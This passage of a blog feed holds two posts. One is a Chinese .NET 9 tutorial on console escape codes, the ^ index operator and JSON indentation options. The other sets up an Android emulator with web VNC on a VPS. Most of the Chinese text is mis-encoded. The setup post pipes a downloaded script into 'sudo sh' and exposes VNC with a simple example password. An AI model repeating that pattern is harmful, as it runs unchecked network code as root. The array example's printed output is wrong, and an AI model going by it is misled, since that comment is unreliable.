href="#ç¤ºä¾‹-4-æ¸…å±å’Œéšè—å…‰æ ‡" class="headerlink" title="ç¤ºä¾‹ 4: æ¸…å±å’Œéšè—å…‰æ ‡"></a>ç¤ºä¾‹ 4: æ¸…å±å’Œéšè—å…‰æ ‡</h2><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// ä½¿ç”¨ \e æ§åˆ¶æ§åˆ¶å°æ¸…å±å’Œéšè—å…‰æ ‡</span></span><br><span class="line">        <span class="built_in">string</span> clearScreen = <span class="string">&quot;\e[2J&quot;</span>; <span class="comment">// æ¸…å±</span></span><br><span class="line">        <span class="built_in">string</span> hideCursor = <span class="string">&quot;\e[?25l&quot;</span>; <span class="comment">// éšè—å…‰æ ‡</span></span><br><span class="line">        <span class="built_in">string</span> showCursor = <span class="string">&quot;\e[?25h&quot;</span>; <span class="comment">// æ˜¾ç¤ºå…‰æ ‡</span></span><br><span class="line"></span><br><span class="line">        Console.WriteLine(<span class="string">&quot;This will be cleared...&quot;</span>);</span><br><span class="line">        Console.WriteLine(clearScreen + <span class="string">&quot;Screen Cleared!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Console.WriteLine(hideCursor + <span class="string">&quot;Cursor Hidden!&quot;</span>);</span><br><span class="line">        Console.WriteLine(<span class="string">&quot;Press Enter to show cursor again...&quot;</span>);</span><br><span class="line">        Console.ReadLine();</span><br><span class="line">        Console.WriteLine(showCursor + <span class="string">&quot;Cursor Visible!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ç¤ºä¾‹-5-åŠ¨æ€åŠ è½½è¿›åº¦æ¡"><a href="#ç¤ºä¾‹-5-åŠ¨æ€åŠ è½½è¿›åº¦æ¡" class="headerlink" title="ç¤ºä¾‹ 5: åŠ¨æ€åŠ è½½è¿›åº¦æ¡"></a>ç¤ºä¾‹ 5: åŠ¨æ€åŠ è½½è¿›åº¦æ¡</h2><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Threading;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">string</span> progressBarTemplate = <span class="string">&quot;\e[32m[####################]\e[0m&quot;</span>;</span><br><span class="line">        <span class="built_in">string</span> clearLine = <span class="string">&quot;\e[2K\r&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">20</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">string</span> progress = <span class="keyword">new</span> <span class="built_in">string</span>(<span class="string">&#x27;#&#x27;</span>, i) + <span class="keyword">new</span> <span class="built_in">string</span>(<span class="string">&#x27; &#x27;</span>, <span class="number">20</span> - i);</span><br><span class="line">            Console.Write(clearLine + <span class="string">$&quot;\e[32m[<span class="subst">&#123;progress&#125;</span>]\e[0m <span class="subst">&#123;i * <span class="number">5</span>&#125;</span>%&quot;</span>);</span><br><span class="line">            Thread.Sleep(<span class="number">200</span>); <span class="comment">// æ¨¡æ‹Ÿä»»åŠ¡å¤„ç†æ—¶é—´</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Console.WriteLine(<span class="string">&quot;\nDone!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¤ºä¾‹æ€»ç»“<br>é¢œè‰²ï¼šç”¨ \e å®šä¹‰é¢œè‰²æ–‡æœ¬éå¸¸æ–¹ä¾¿ã€‚<br>å…‰æ ‡æ§åˆ¶ï¼š\e å¯ç”¨æ¥å®ç°å…‰æ ‡çš„ç§»åŠ¨ã€éšè—å’Œæ˜¾ç¤ºã€‚<br>æ··åˆæ ·å¼ï¼šæ”¯æŒå¤šç§æ ·å¼ç»„åˆï¼Œæ¯”å¦‚ç²—ä½“ã€ä¸‹åˆ’çº¿å’Œé¢œè‰²ã€‚<br>å±å¹•æ“ä½œï¼šæ¸…å±ã€éšè—å…‰æ ‡ç­‰åŠŸèƒ½å¤§å¹…æé«˜äº†ç»ˆç«¯äº¤äº’çš„çµæ´»æ€§ã€‚<br>åŠ¨æ€æ•ˆæœï¼šç”¨ \e åˆ›å»ºè¿›åº¦æ¡ã€åŠ¨æ€è¾“å‡ºç­‰éå¸¸ç›´è§‚ã€‚</p><h1 id="ç´¢å¼•è¿ç®—ç¬¦"><a href="#ç´¢å¼•è¿ç®—ç¬¦" class="headerlink" title="ç´¢å¼•è¿ç®—ç¬¦"></a>ç´¢å¼•è¿ç®—ç¬¦</h1><p> éšå¼â€œä»æœ«å°¾å¼€å§‹â€ç´¢å¼•è¿ç®—ç¬¦ ^ï¼Œéœ€è¦æŒ‰ç…§ä»¥ä¸‹æ­¥éª¤æ“ä½œã€‚ä»¥ä¸‹æ˜¯å®Œæ•´çš„ç”¨æ³•æŒ‡å—ï¼š</p><p>å‰ç½®æ¡ä»¶<br>ç¯å¢ƒè¦æ±‚ï¼š<br>C# 8.0 æˆ–æ›´é«˜ç‰ˆæœ¬ã€‚<br>.NET Core 3.0 æˆ–æ›´é«˜ç‰ˆæœ¬ï¼Œæˆ– .NET Framework æ”¯æŒçš„ç‰ˆæœ¬ã€‚<br>buffer å±æ€§è¦æ±‚ï¼š<br>buffer å¿…é¡»æ˜¯æ”¯æŒç´¢å¼•å™¨çš„ç±»å‹ï¼Œä¾‹å¦‚æ•°ç»„ (T[])ã€åˆ—è¡¨ (List<T>) æˆ–å…¶ä»–å®ç°äº† IList<T> çš„é›†åˆç±»å‹ã€‚</p><h2 id="ä»£ç ç¤ºä¾‹"><a href="#ä»£ç ç¤ºä¾‹" class="headerlink" title="ä»£ç ç¤ºä¾‹"></a>ä»£ç ç¤ºä¾‹</h2><h3 id="1-ä½¿ç”¨æ•°ç»„"><a href="#1-ä½¿ç”¨æ•°ç»„" class="headerlink" title="1. ä½¿ç”¨æ•°ç»„"></a>1. ä½¿ç”¨æ•°ç»„</h3><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title">S</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">int</span>[] buffer = <span class="keyword">new</span> <span class="built_in">int</span>[<span class="number">10</span>]; <span class="comment">// å®šä¹‰ä¸€ä¸ªå¤§å°ä¸º10çš„æ•°ç»„</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> v = <span class="keyword">new</span> S()</span><br><span class="line">        &#123;</span><br><span class="line">            buffer =</span><br><span class="line">            &#123;</span><br><span class="line">                [^<span class="number">1</span>] = <span class="number">0</span>,  <span class="comment">// å€’æ•°ç¬¬1ä¸ªå…ƒç´ è®¾ç½®ä¸º 0</span></span><br><span class="line">                [^<span class="number">2</span>] = <span class="number">1</span>,  <span class="comment">// å€’æ•°ç¬¬2ä¸ªå…ƒç´ è®¾ç½®ä¸º 1</span></span><br><span class="line">                [^<span class="number">3</span>] = <span class="number">2</span>,  <span class="comment">// å€’æ•°ç¬¬3ä¸ªå…ƒç´ è®¾ç½®ä¸º 2</span></span><br><span class="line">                [^<span class="number">4</span>] = <span class="number">3</span>,  <span class="comment">// å€’æ•°ç¬¬4ä¸ªå…ƒç´ è®¾ç½®ä¸º 3</span></span><br><span class="line">                [^<span class="number">5</span>] = <span class="number">4</span>   <span class="comment">// å€’æ•°ç¬¬5ä¸ªå…ƒç´ è®¾ç½®ä¸º 4</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è¾“å‡ºç»“æœ</span></span><br><span class="line">        Console.WriteLine(<span class="built_in">string</span>.Join(<span class="string">&quot;, &quot;</span>, v.buffer));</span><br><span class="line">        <span class="comment">// è¾“å‡º: 0, 0, 0, 0, 4, 3, 2, 1, 0, 0</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-ä½¿ç”¨-List"><a href="#2-ä½¿ç”¨-List" class="headerlink" title="2. ä½¿ç”¨ List"></a>2. ä½¿ç”¨ List<T></h3><p>å¦‚æœ buffer æ˜¯ä¸€ä¸ª List<int>ï¼Œå¯ä»¥è¿™æ ·åˆå§‹åŒ–ï¼š</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title">S</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;<span class="built_in">int</span>&gt; buffer = <span class="keyword">new</span> List&lt;<span class="built_in">int</span>&gt;(<span class="keyword">new</span> <span class="built_in">int</span>[<span class="number">10</span>]); <span class="comment">// åˆå§‹åŒ–ä¸º10ä¸ªå…ƒç´ </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> v = <span class="keyword">new</span> S()</span><br><span class="line">        &#123;</span><br><span class="line">            buffer =</span><br><span class="line">            &#123;</span><br><span class="line">                [^<span class="number">1</span>] = <span class="number">0</span>,</span><br><span class="line">                [^<span class="number">2</span>] = <span class="number">1</span>,</span><br><span class="line">                [^<span class="number">3</span>] = <span class="number">2</span>,</span><br><span class="line">                [^<span class="number">4</span>] = <span class="number">3</span>,</span><br><span class="line">                [^<span class="number">5</span>] = <span class="number">4</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è¾“å‡ºç»“æœ</span></span><br><span class="line">        Console.WriteLine(<span class="built_in">string</span>.Join(<span class="string">&quot;, &quot;</span>, v.buffer));</span><br><span class="line">        <span class="comment">// è¾“å‡º: 0, 0, 0, 0, 4, 3, 2, 1, 0, 0</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h1><p>JsonSerializerOptions  ç¼©è¿›é€‰é¡¹ ï¼Œå¯æ”¯æŒè‡ªå®šä¹‰å†™å…¥ JSON çš„ç¼©è¿›å­—ç¬¦å’Œç¼©è¿›å¤§å°ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">var options = new JsonSerializerOptions</span><br><span class="line">&#123;</span><br><span class="line">    WriteIndented = <span class="literal">true</span>,</span><br><span class="line">    IndentCharacter = <span class="string">&#x27;\t&#x27;</span>,</span><br><span class="line">    IndentSize = 2,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">string json = JsonSerializer.Serialize(</span><br><span class="line">    new &#123; Value = 1 &#125;,</span><br><span class="line">    options</span><br><span class="line">    );</span><br><span class="line">Console.WriteLine(json);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">var data = new</span><br><span class="line">&#123;</span><br><span class="line">    Name = <span class="string">&quot;Alice&quot;</span>,</span><br><span class="line">    Age = 30,</span><br><span class="line">    Skills = new[] &#123; <span class="string">&quot;C#&quot;</span>, <span class="string">&quot;ASP.NET Core&quot;</span>, <span class="string">&quot;Blazor&quot;</span> &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">// é»˜è®¤ç¼©è¿›æ ¼å¼</span><br><span class="line">var defaultOptions = new JsonSerializerOptions</span><br><span class="line">&#123;</span><br><span class="line">    WriteIndented = <span class="literal">true</span></span><br><span class="line">&#125;;</span><br><span class="line">Console.WriteLine(<span class="string">&quot;é»˜è®¤æ ¼å¼:&quot;</span>);</span><br><span class="line">Console.WriteLine(JsonSerializer.Serialize(data, defaultOptions));</span><br><span class="line"></span><br><span class="line">// ä½¿ç”¨è‡ªå®šä¹‰ç¼©è¿›å­—ç¬¦ï¼ˆåˆ¶è¡¨ç¬¦ï¼‰å’Œå¤§å°</span><br><span class="line">var customOptions = new JsonSerializerOptions</span><br><span class="line">&#123;</span><br><span class="line">    WriteIndented = <span class="literal">true</span>,</span><br><span class="line">    IndentCharacter = <span class="string">&#x27;\t&#x27;</span>, // ä½¿ç”¨åˆ¶è¡¨ç¬¦</span><br><span class="line">    IndentSize = 1      // æ¯å±‚ç¼©è¿› 1 ä¸ªåˆ¶è¡¨ç¬¦</span><br><span class="line">&#125;;</span><br><span class="line">Console.WriteLine(<span class="string">&quot;\nè‡ªå®šä¹‰åˆ¶è¡¨ç¬¦ç¼©è¿›:&quot;</span>);</span><br><span class="line">Console.WriteLine(JsonSerializer.Serialize(data, customOptions));</span><br><span class="line"></span><br><span class="line">// ä½¿ç”¨è‡ªå®šä¹‰ç©ºæ ¼ç¼©è¿›</span><br><span class="line">var customSpaceOptions = new JsonSerializerOptions</span><br><span class="line">&#123;</span><br><span class="line">    WriteIndented = <span class="literal">true</span>,</span><br><span class="line">    IndentCharacter = <span class="string">&#x27; &#x27;</span>,  // ä½¿ç”¨ç©ºæ ¼</span><br><span class="line">    IndentSize = 4      // æ¯å±‚ç¼©è¿› 4 ä¸ªç©ºæ ¼</span><br><span class="line">&#125;;</span><br><span class="line">Console.WriteLine(<span class="string">&quot;\nè‡ªå®šä¹‰ç©ºæ ¼ç¼©è¿›:&quot;</span>);</span><br><span class="line">Console.WriteLine(JsonSerializer.Serialize(data, customSpaceOptions));</span><br></pre></td></tr></table></figure><p>ç»“æœ<br>{<br>                â€œValueâ€: 1<br>}<br>é»˜è®¤æ ¼å¼:<br>{<br>  â€œNameâ€: â€œAliceâ€,<br>  â€œAgeâ€: 30,<br>  â€œSkillsâ€: [<br>    â€œC#â€,<br>    â€œASP.NET Coreâ€,<br>    â€œBlazorâ€<br>  ]<br>}</p><p>è‡ªå®šä¹‰åˆ¶è¡¨ç¬¦ç¼©è¿›:<br>{<br>        â€œNameâ€: â€œAliceâ€,<br>        â€œAgeâ€: 30,<br>        â€œSkillsâ€: [<br>                â€œC#â€,<br>                â€œASP.NET Coreâ€,<br>                â€œBlazorâ€<br>        ]<br>}</p><p>è‡ªå®šä¹‰ç©ºæ ¼ç¼©è¿›:<br>{<br>    â€œNameâ€: â€œAliceâ€,<br>    â€œAgeâ€: 30,<br>    â€œSkillsâ€: [<br>        â€œC#â€,<br>        â€œASP.NET Coreâ€,<br>        â€œBlazorâ€<br>    ]<br>}</p><h3 id="JsonSerializerOptions"><a href="#JsonSerializerOptions" class="headerlink" title="JsonSerializerOptions"></a>JsonSerializerOptions</h3><p>æ–°å¢äº†å¯¹è‡ªå®šä¹‰ JSON ç¼©è¿›å­—ç¬¦å’Œç¼©è¿›å¤§å°çš„æ”¯æŒã€‚è¿™é¡¹ç‰¹æ€§ä¸»è¦é€šè¿‡ä¸¤ä¸ªæ–°å±æ€§å®ç°ï¼š</p><p>IndentChars: æŒ‡å®šç”¨äºç¼©è¿›çš„å­—ç¬¦ï¼ˆé»˜è®¤ä¸ºç©ºæ ¼ â€œ â€œï¼‰ã€‚<br>IndentSize: æŒ‡å®šç¼©è¿›çš„å¤§å°ï¼ˆé»˜è®¤ä¸º 2ï¼‰ã€‚<br>è¿™äº›å±æ€§è®©å¼€å‘è€…çµæ´»æ§åˆ¶ JSON æ ¼å¼ï¼Œé€‚é…ä¸åŒéœ€æ±‚ï¼š</p><p>æ—¥å¿—ä¼˜åŒ–: æé«˜å¯è¯»æ€§ï¼Œä¾¿äºç»“æ„å®šä½ã€‚<br>å‰ç«¯é€‚é…: ç¬¦åˆæ¡†æ¶ç¼©è¿›è¦æ±‚ã€‚<br>ç©ºé—´èŠ‚çº¦: å‡å°‘ JSON ä½“ç§¯ã€‚<br>å·¥å…·å…¼å®¹: æ»¡è¶³å¤–éƒ¨æ ¼å¼è¦æ±‚ã€‚</p><h3 id="JsonSerializerOptions-Web"><a href="#JsonSerializerOptions-Web" class="headerlink" title="JsonSerializerOptions.Web"></a>JsonSerializerOptions.Web</h3><p>æ˜¯ä¸€ä¸ªæ–°çš„å•ä¾‹å®ä¾‹ï¼Œä¸“ä¸º Web åº”ç”¨ç¨‹åºè®¾è®¡ï¼Œæä¾›äº†é»˜è®¤çš„ JSON åºåˆ—åŒ–é€‰é¡¹ã€‚å®ƒçš„ä¸»è¦ç‰¹ç‚¹åŒ…æ‹¬ï¼š</p><p>å±æ€§å‘½åç­–ç•¥ï¼šå°†å±æ€§åç§°ä» PascalCase è½¬æ¢ä¸º camelCaseï¼Œä»¥ç¬¦åˆ JavaScript çš„å‘½åæƒ¯ä¾‹ã€‚</p><p>å¿½ç•¥é»˜è®¤å€¼ï¼šåœ¨åºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œå¿½ç•¥å±æ€§çš„é»˜è®¤å€¼ï¼ˆå¦‚ nullã€0ã€falseï¼‰ï¼Œä»¥å‡å°‘ä¼ è¾“çš„æ•°æ®é‡ã€‚</p><p>æ•°å­—å¤„ç†ï¼šå…è®¸ä»å­—ç¬¦ä¸²è¯»å–æ•°å­—ï¼Œä»¥æé«˜çµæ´»æ€§ã€‚</p><p>è¿™äº›é»˜è®¤è®¾ç½®ä½¿å¾—åœ¨ Web ç¯å¢ƒä¸­è¿›è¡Œ JSON åºåˆ—åŒ–æ—¶ï¼Œæ— éœ€æ‰‹åŠ¨é…ç½®å³å¯è·å¾—ç¬¦åˆ Web æ ‡å‡†çš„è¾“å‡ºã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">public class Product</span><br><span class="line">&#123;</span><br><span class="line">    public int Id &#123; get; <span class="built_in">set</span>; &#125;</span><br><span class="line">    public string Name &#123; get; <span class="built_in">set</span>; &#125; = <span class="string">&quot;P1-DWD1&quot;</span>;</span><br><span class="line">    public decimal Price &#123; get; <span class="built_in">set</span>; &#125; = 0.0m; // é»˜è®¤å€¼</span><br><span class="line">    public string? Description &#123; get; <span class="built_in">set</span>; &#125; = null; // å¯ç©ºç±»å‹</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public class Program</span><br><span class="line">&#123;</span><br><span class="line">    static void Main(string[] args)</span><br><span class="line">    &#123;</span><br><span class="line">        var product = new Product();</span><br><span class="line"></span><br><span class="line">        // ä½¿ç”¨ JsonSerializerOptions.Web è¿›è¡Œåºåˆ—åŒ–</span><br><span class="line">        string json = JsonSerializer.Serialize(product, JsonSerializerOptions.Web);</span><br><span class="line"></span><br><span class="line">        Console.WriteLine(json);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>{â€œidâ€:0,â€nameâ€:â€P1-DWD1â€,â€priceâ€:0.0,â€descriptionâ€:null}</p><h1 id="Debian-NET9"><a href="#Debian-NET9" class="headerlink" title="Debian .NET9"></a>Debian .NET9</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">wget https://download.visualstudio.microsoft.com/download/pr/xxx/dotnet-sdk-9.0.0.deb</span><br><span class="line">sudo dpkg -i dotnet-sdk-9.0.0.deb</span><br><span class="line">sudo apt-get install -f  <span class="comment"># å¦‚æœæœ‰ä¾èµ–é—®é¢˜</span></span><br><span class="line">dotnet --version</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;NET9&quot;&gt;&lt;a href=&quot;#NET9&quot; class=&quot;headerlink&quot; title=&quot;.NET9&quot;&gt;&lt;/a&gt;.NET9&lt;/h1&gt;&lt;p&gt;è¿„ä»Šä¸ºæ­¢æœ€é«˜æ•ˆã€æœ€ç°ä»£ã€æœ€å®‰å…¨ã€æœ€æ™ºèƒ½ã€æ€§èƒ½æœ€é«˜çš„.NETç‰ˆæœ¬&lt;/p&gt;
&lt;figure class=&quot;highlight</summary>
      
    
    
    
    <category term="æŠ€æœ¯" scheme="https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term=".net9" scheme="https://banjinmei.github.io/tags/net9/"/>
    
  </entry>
  
  <entry>
    <title>vps cloud mobile</title>
    <link href="https://banjinmei.github.io/2025/01/02/vps-cloud-mobile/"/>
    <id>https://banjinmei.github.io/2025/01/02/vps-cloud-mobile/</id>
    <published>2025-01-01T16:00:38.000Z</published>
    <updated>2025-01-01T16:03:27.039Z</updated>
    
    <content type="html"><![CDATA[<h1 id="vps-cloud-mobile"><a href="#vps-cloud-mobile" class="headerlink" title="vps cloud mobile"></a>vps cloud mobile</h1><p>VPSäº‘æœåŠ¡å™¨æ­å»ºäº‘æ‰‹æœºæ•™ç¨‹</p><h1 id="é¦–å…ˆæ£€æŸ¥è‡ªå·±vpsæ˜¯å¦æ”¯æŒè¿™ä¸ªé¡¹ç›®"><a href="#é¦–å…ˆæ£€æŸ¥è‡ªå·±vpsæ˜¯å¦æ”¯æŒè¿™ä¸ªé¡¹ç›®" class="headerlink" title="é¦–å…ˆæ£€æŸ¥è‡ªå·±vpsæ˜¯å¦æ”¯æŒè¿™ä¸ªé¡¹ç›®"></a>é¦–å…ˆæ£€æŸ¥è‡ªå·±vpsæ˜¯å¦æ”¯æŒè¿™ä¸ªé¡¹ç›®</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install cpu-checker</span><br><span class="line">kvm-ok</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">INFO: /dev/kvm exists</span><br><span class="line">KVM acceleration can be used</span><br></pre></td></tr></table></figure><p>è¡¨ç¤ºæ”¯æŒï¼Œå¯ä»¥ç»§ç»­å¾€ä¸‹çœ‹ ac13</p><h1 id="å®‰è£…docker"><a href="#å®‰è£…docker" class="headerlink" title="å®‰è£…docker"></a>å®‰è£…docker</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https://get.docker.com | sudo sh</span><br></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯ç›´æ¥å¼•ç”¨å¤§ä½¬çš„é¡¹ç›®äº†ï¼ˆæ„Ÿè°¢budtmoå¤§ä½¬çš„åˆ†äº«ï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">docker run -d -p 29898:6080 -e EMULATOR_DEVICE=<span class="string">&quot;Samsung Galaxy S10&quot;</span> -e WEB_VNC=<span class="literal">true</span> -e VNC_PASSWORD=nodeseek --device /dev/kvm --name android-container budtmo/docker-android:emulator_11.0</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œä¸Šé¢çš„ä»£ç 29898å¯ä»¥æ”¹æˆè‡ªå·±æƒ³è¦çš„ç«¯å£<br>nodeseekæ”¹æˆè‡ªå·±æƒ³è¦çš„å¯†ç <br>budtmo&#x2F;docker-android:emulator_11.0ï¼Œå¯ä»¥é€‰æ‹©å®‰å“9.0åˆ°13.0ï¼ˆæ ¹æ®è‡ªå·±çš„vpsé…ç½®ï¼Œç›´æ¥æ”¹æœ€åé¢çš„æ•°å­—ï¼‰<br>Samsung Galaxy S10å¯ä»¥æ ¹æ®è‡ªå·±çš„é…ç½®é€‰æ‹©è‡ªå·±æƒ³è¦çš„æœºå‹ï¼Œè®¾å¤‡åå•å…·ä½“è§ä¸‹è¡¨</p><p>ç§ç±» è®¾å¤‡åç§°</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Phone Samsung Galaxy S10</span><br><span class="line">Phone Samsung Galaxy S9</span><br><span class="line">Phone Samsung Galaxy S8</span><br><span class="line">Phone Samsung Galaxy S7 Edge</span><br><span class="line">Phone Samsung Galaxy S7</span><br><span class="line">Phone Samsung Galaxy S6</span><br><span class="line">Phone Nexus 4</span><br><span class="line">Phone Nexus 5</span><br><span class="line">Phone Nexus One</span><br><span class="line">Phone Nexus S</span><br><span class="line">Tablet Nexus 7</span><br></pre></td></tr></table></figure><p>è¿è¡Œå®Œæˆåï¼Œæ‰“å¼€æµè§ˆå™¨ï¼Œåœ°å€æ è¾“å…¥IPï¼šç«¯å£ å³å¯è®¿é—®äº†ï¼</p>]]></content>
    
    
      
      
